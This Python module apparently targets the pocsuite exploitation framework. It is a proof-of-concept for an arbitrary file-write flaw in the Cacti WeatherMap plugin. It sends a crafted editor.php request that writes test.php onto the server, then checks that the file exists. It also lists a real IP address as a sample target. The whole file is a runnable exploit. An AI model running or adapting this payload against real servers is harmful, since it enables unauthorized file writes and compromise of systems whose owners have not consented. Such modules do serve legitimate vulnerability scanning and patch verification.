#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '00001'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2017-08-12'
    createDate = '2017-08-12'
    updateDate = '2017-08-12'
    references = ['http://www.wooyun.org/bugs/wooyun-2010-0179762']
    name = 'Cacti WeatherMap插件漏洞 PoC'
    appPowerLink = 'https://www.cacti.com'
    appName = 'Cacti'
    appVersion = 'All'
    vulType = 'File Upload'
    desc = '''
            Cacti 的 weathermap 插件，可写入任意文件
    '''
    samples = ['http://202.29.104.34']

    def _verify(self):
        result = {}
        payload = '/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=\
        &node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=\
        &link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=\
        Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7'
        vulurl = self.url + payload
        verurl = self.url + '/plugins/weathermap/configs/test.php'
        req.get(vulurl)
        req_ver = req.get(verurl)
        if req_ver.status_code == 200 and '46ea1712d4b13b55b3f680cc5b8b54e8' in req_ver.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = payload
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output


register(TestPOC)
